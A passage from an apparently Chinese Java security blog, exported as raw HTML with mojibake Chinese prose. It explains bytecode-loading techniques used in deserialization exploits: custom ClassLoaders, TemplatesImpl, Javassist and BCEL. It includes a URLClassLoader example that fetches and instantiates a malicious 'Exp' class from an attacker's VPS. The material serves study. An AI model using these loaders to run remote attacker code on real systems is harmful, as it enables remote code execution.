dirPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dirPath.endsWith(<span class="string">&quot;/&quot;</span>) &amp;&amp; !dirPath.endsWith(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">            dirPath += <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.dirPath = dirPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> dirPath + name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] b;</span><br><span class="line">        Path path;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            path = Paths.get(<span class="keyword">new</span> <span class="title class_">URI</span>(filePath));</span><br><span class="line">            b = Files.readAllBytes(path);</span><br><span class="line">            <span class="comment">// defineClasså°†å­—èŠ‚æ•°ç»„è½¬æ¢æˆClasså¯¹è±¡</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3ã€URLClassLoader-ï¼ˆè¿œç¨‹åŠ è½½-Class-æ–‡ä»¶ï¼‰"><a href="#3ã€URLClassLoader-ï¼ˆè¿œç¨‹åŠ è½½-Class-æ–‡ä»¶ï¼‰" class="headerlink" title="3ã€URLClassLoader ï¼ˆè¿œç¨‹åŠ è½½ Class æ–‡ä»¶ï¼‰"></a>3ã€URLClassLoader ï¼ˆè¿œç¨‹åŠ è½½ Class æ–‡ä»¶ï¼‰</h3><p>è¿™ä¸ªåŠ è½½æ–¹å¼æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å¯ä»¥è¿œç¨‹è¿›è¡ŒåŠ è½½ï¼Œæˆ‘ä»¬åœ¨ VPS ä¸Šå¯ä¸€ä¸ª http æœåŠ¡ï¼ŒæŠŠæ¶æ„ç±»æ”¾åœ¨ http æœåŠ¡ä¸‹ï¼Œå¯ä»¥å®ç°è¿œç¨‹åŠ è½½ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ä¸€ä¸ª URL åœ°å€ï¼Œ è¿™é‡Œæ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹</span></span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://192.168.1.5:80/&quot;</span>)&#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// ä½¿ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ class æ–‡ä»¶</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls).loadClass(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–æˆ‘ä»¬çš„æ¶æ„ç±»</span></span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4ã€defineClass-åŠ è½½å­—èŠ‚ç "><a href="#4ã€defineClass-åŠ è½½å­—èŠ‚ç " class="headerlink" title="4ã€defineClass() åŠ è½½å­—èŠ‚ç "></a>4ã€defineClass() åŠ è½½å­—èŠ‚ç </h3><p>ä¸ç®¡æ˜¯åŠ è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°classæ–‡ä»¶ï¼ŒJavaéƒ½ç»å†äº†ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•çš„è°ƒç”¨ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714635737705-c5e9f19b-aa47-4243-b720-418df35c066e.png"></p><p>:::tips<br>å…¶ä¸­ï¼š </p><p>loadClass çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœº åˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass </p><p>findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå°±åƒä¸Šä¸€èŠ‚ä¸­è¯´åˆ°çš„ï¼Œå¯èƒ½ä¼šåœ¨ æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClass </p><p>defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±» </p><p>æ‰€ä»¥å¯è§ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ defineClass ï¼Œä»–å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJava é»˜è®¤çš„ ClassLoader#defineClass æ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼Œé€»è¾‘åœ¨JVMçš„Cè¯­è¨€ä»£ç ä¸­ã€‚</p><p>:::</p><p>ä½¿ç”¨ClassLoader#defineClass()ç›´æ¥åŠ è½½ç±»å­—èŠ‚ç çš„ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDefineClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> </span><br><span class="line">ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, </span><br><span class="line"><span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = </span><br><span class="line">Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA</span></span><br><span class="line"><span class="string">Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs</span></span><br><span class="line"><span class="string">bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh</span></span><br><span class="line"><span class="string">L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry</span></span><br><span class="line"><span class="string">ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n</span></span><br><span class="line"><span class="string">OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA</span></span><br><span class="line"><span class="string">AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> </span><br><span class="line">(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, </span><br><span class="line"><span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClassLoader#defineClass()è¢«è°ƒç”¨æ—¶ï¼ŒClasså¯¹è±¡å¹¶ä¸ä¼šè¢«åˆå§‹åŒ–ï¼Œåªæœ‰æ˜¾ç¤ºè°ƒç”¨å…¶æ„é€ æ–¹æ³•ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚å³ä½¿å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼Œåœ¨defineClassæ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚å› æ­¤ï¼Œå¦‚æœè¦ä½¿ç”¨defineClass()åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ æ–¹æ³•ã€‚</p><h3 id="5ã€åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç "><a href="#5ã€åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç " class="headerlink" title="5ã€åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç "></a>5ã€åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç </h3><p>è¿™é‡Œè¿˜æ˜¯è®°å½•ä¸‹ä¸»è¦æ˜¯ä»ä¸‹é¢è¿™ä¸¤ç¯‡æ–‡ç« æŠ„çš„</p><p>è¿™ä¸ªæ¼æ´çš„è§¦å‘ç‚¹åœ¨ <code>TemplatesImpl.newTransformer()</code> æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬æ¥çœ‹å…·ä½“çš„ä»£ç ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481708317-16999829-6682-4592-9972-ce5908531fd4.png"></p><p>è·Ÿåˆ°getTransletInstanceé‡Œå»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481734618-64f852aa-16ee-44b2-9b46-14809565c5f1.png">è¿™é‡Œè¦æ±‚_nameä¸èƒ½ä¸ºnullå¦åˆ™å°±ç›´æ¥è¿”å›nulläº†_classå¿…é¡»ä¸ºnullå¦åˆ™è¿›ä¸å»defineTransletClassesæ–¹æ³•é‡Œ<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481813567-5f113878-7bbe-4239-a0c1-e433b8b39bea.png"></p><p>è¿™é‡Œä¸»è¦åœ¨è¿™ä¸ªforå¾ªç¯é‡Œæœ‰defineClassæ–¹æ³•é‡Œè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481877903-4792c263-1e5a-4f17-a171-5453d88af998.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481894465-a4963829-d74b-4a83-bc31-7896345aa676.png"></p><p>æœ€ç»ˆè¿˜æ˜¯è°ƒç”¨javaåŸç”Ÿçš„defineclassåŠ è½½ç±»ï¼Œè®°å½•ä¸‹è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">    getTransletInstance()</span><br><span class="line">        defineTransletClasses()</span><br><span class="line">            defineClass()</span><br><span class="line">                ClassLoader.defineClass()               </span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714636913715-f37e64de-8702-4540-abe9-6ffa8b296794.pdf">Javaå®‰å…¨æ¼«è°ˆ - 13.Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é‚£äº›æ–¹æ³•.pdf</a></p><p><a href="https://www.lianqing.xyz/?p=561">https://www.lianqing.xyz/?p=561</a></p><h3 id="6ã€Javassitåº“ï¼š"><a href="#6ã€Javassitåº“ï¼š" class="headerlink" title="6ã€Javassitåº“ï¼š"></a>6ã€Javassitåº“ï¼š</h3><p><font style="color:rgb(51, 51, 51);">Javassistæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†æã€ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“ï¼Œå¯ä»¥ç›´æ¥ç¼–è¾‘å’Œç”ŸæˆJavaç”Ÿæˆçš„å­—èŠ‚ç ã€‚<br></font><font style="color:rgb(51, 51, 51);">èƒ½å¤Ÿåœ¨è¿è¡Œæ—¶å®šä¹‰æ–°çš„Javaç±»ï¼Œåœ¨JVMåŠ è½½ç±»æ–‡ä»¶æ—¶ä¿®æ”¹ç±»çš„å®šä¹‰ã€‚<br></font>Javassistç±»åº“æä¾›äº†ä¸¤ä¸ªå±‚æ¬¡çš„APIï¼Œæºä»£ç å±‚æ¬¡å’Œå­—èŠ‚ç å±‚æ¬¡ã€‚æºä»£ç å±‚æ¬¡çš„APIèƒ½å¤Ÿä»¥Javaæºä»£ç çš„å½¢å¼ä¿®æ”¹Javaå­—èŠ‚ç ã€‚å­—èŠ‚ç å±‚æ¬¡çš„APIèƒ½å¤Ÿç›´æ¥ç¼–è¾‘Javaç±»æ–‡ä»¶ã€‚</p><p>å‘Mavençš„Pom.xmlæ–‡ä»¶ä¸­ï¼Œæ·»åŠ ä»¥ä¸‹å­—æ®µï¼Œä»¥å¯¼å…¥ä¾èµ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javassist/javassist --&gt;</span></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;javassist&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">3.12</span><span class="number">.1</span>.GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªåŒ…ä¸­ï¼Œä¸»è¦è°ƒç”¨åˆ°çš„æ–¹æ³•æ˜¯:</p><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool:"></a>ClassPool:</h4><p>ClassPoolæ˜¯CtClasså¯¹è±¡çš„å®¹å™¨ï¼Œå®ƒæŒ‰éœ€è¯»å–ç±»æ–‡ä»¶æ¥æ„é€ CtClasså¯¹è±¡ï¼Œå¹¶ä¸”ä¿å­˜CtClasså¯¹è±¡ä»¥ä¾¿ä»¥åä½¿ç”¨ï¼Œå…¶ä¸­é”®åæ˜¯ç±»åç§°ï¼Œå€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„CtClasså¯¹è±¡ã€‚</p><p>å¸¸ç”¨æ–¹æ³•ï¼š</p><ul><li>static ClassPool getDefault()ï¼šè¿”å›é»˜è®¤çš„ClassPoolï¼Œä¸€èˆ¬é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºæˆ‘ä»¬çš„ClassPoolï¼›</li><li>ClassPath insertClassPath(ClassPath cp)ï¼šå°†ä¸€ä¸ªClassPathå¯¹è±¡æ’å…¥åˆ°ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®ï¼›</li><li>ClassPath appendClassPathï¼šå°†ä¸€ä¸ªClassPathå¯¹è±¡åŠ åˆ°ç±»æœç´¢è·¯å¾„çš„æœ«å°¾ä½ç½®ï¼›</li><li>CtClass makeClassï¼šæ ¹æ®ç±»ååˆ›å»ºæ–°çš„CtClasså¯¹è±¡ï¼›</li><li>CtClass get(java.lang.String classname)ï¼šä»æºä¸­è¯»å–ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›å¯¹CtClass è¡¨ç¤ºè¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡çš„å¼•ç”¨ï¼›</li></ul><h4 id="CtClassï¼š"><a href="#CtClassï¼š" class="headerlink" title="CtClassï¼š"></a><strong>CtClassï¼š</strong></h4><p>CtClassç±»è¡¨ç¤ºä¸€ä¸ªclassæ–‡ä»¶ï¼Œæ¯ä¸ªCtClasså¯¹è±¡éƒ½å¿…é¡»ä»ClassPoolä¸­è·å–ã€‚</p><p>å¸¸ç”¨æ–¹æ³•ï¼š</p><ul><li>void setSuperclass(CtClass clazz)ï¼šæ›´æ”¹è¶…ç±»ï¼Œé™¤éæ­¤å¯¹è±¡è¡¨ç¤ºæ¥å£ï¼›</li><li>byte[] toBytecode()ï¼šå°†è¯¥ç±»è½¬æ¢ä¸ºç±»æ–‡ä»¶ï¼›</li><li>CtConstructor makeClassInitializer()ï¼šåˆ¶ä½œä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ç¨‹åºï¼ˆé™æ€æ„é€ å‡½æ•°ï¼‰ï¼›</li></ul><h4 id="ç¤ºä¾‹ï¼š"><a href="#ç¤ºä¾‹ï¼š" class="headerlink" title="ç¤ºä¾‹ï¼š"></a>ç¤ºä¾‹ï¼š</h4><p>è·å–å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(com.classloader.TemplatesImplEvil.class.getName());</span><br><span class="line"><span class="type">byte</span>[] code = clazz.toBytecode();</span><br></pre></td></tr></table></figure><h3 id="7ã€BCELåŠ è½½å­—èŠ‚ç "><a href="#7ã€BCELåŠ è½½å­—èŠ‚ç " class="headerlink" title="7ã€BCELåŠ è½½å­—èŠ‚ç "></a>7ã€BCELåŠ è½½å­—èŠ‚ç </h3><p>è¿™é‡Œå› ä¸ºå­¦ä¹ fastjsonè¦ç”¨åˆ°bcelå­—èŠ‚ç æ‰€ä»¥è¿™é‡Œå­¦ä¹ ä¸‹å¦‚ä½•åˆ©ç”¨bcelåŠ è½½å­—èŠ‚ç </p><p>è¿™é‡Œæˆ‘ä»¬å…ˆå‡†å¤‡ä¸€ä¸ªæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelLoad</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + encode).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥è·Ÿä¸€ä¸‹è°ƒç”¨æµç¨‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733475436704-968d0652-4608-40ed-8403-1ba42538a004.png"></p><p>è·Ÿåˆ°loadclassé‡Œä¼šè°ƒç”¨è¿™ä¸ªcreatClassæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733475540748-0f7737d6-ef04-49b9-b2b2-fe920caaf441.png"></p><p>åœ¨<code>createClass()</code>ä¸­,é€šè¿‡<code>subString()</code>æˆªå–<code>$$BCEL$$</code>åçš„å­—ç¬¦ä¸²ï¼Œå¹¶è°ƒç”¨<code>Utility.decode</code>è¿›è¡Œç›¸åº”çš„è§£ç å¹¶æœ€ç»ˆè¿”å›æ”¹å­—èŠ‚ç çš„bytesæ•°ç»„(decodeæ–¹æ³•å‚æ•°uncompressç”¨æ¥æ ‡è¯†æ˜¯å¦ä¸ºzipæµï¼Œå½“ä¸ºtrueæ—¶èµ°zipæµè§£ç )ã€‚ä¹‹åç”Ÿæˆ<code>Parser</code>è§£æå™¨å¹¶è°ƒç”¨<code>parse()</code>æ–¹æ³•è¿›è¡Œè§£æï¼Œå¹¶ç”Ÿæˆ<code>JavaClass</code>å¯¹è±¡ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733475782900-e6054f2a-4dde-4f5e-a4a6-11665607f06e.png"></p><p>ä¹‹ååœ¨è°ƒç”¨defineclassæ–¹æ³•è¿›è¡ŒåŠ è½½ï¼Œåé¢å°±æ˜¯è°ƒç”¨newinstanceè¿›è¡Œåˆå§‹åŒ–åŠ è½½é™æ€ä»£ç å—äº†</p><p>å‚è€ƒï¼š<a href="https://www.lianqing.xyz/?p=561">https://www.lianqing.xyz/?p=561</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­—èŠ‚ç  </tag>
            
            <tag> JavaåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMIååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="RMIåŸç†"><a href="#RMIåŸç†" class="headerlink" title="RMIåŸç†"></a>RMIåŸç†</h2><p>è¿™éƒ¨åˆ†å·²ç»è®°å½•è¿‡äº†ä¹Ÿå‚è€ƒäº†è®¸å¤šä½¬çš„æ–‡ç« å¯ä»¥ç›´æ¥çœ‹è‡ªå·±çš„ç¬”è®°</p><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/yk0fv5pk1ssnkqxr">Java RmiåŸç†</a></p><h2 id="RMIåˆ›å»ºæµç¨‹"><a href="#RMIåˆ›å»ºæµç¨‹" class="headerlink" title="RMIåˆ›å»ºæµç¨‹"></a>RMIåˆ›å»ºæµç¨‹</h2><p>å…ˆæå‰ç»™å‡ºæºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IRemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">IRemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">iRemoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IRemoteObjImpl</span>();</span><br><span class="line">        <span 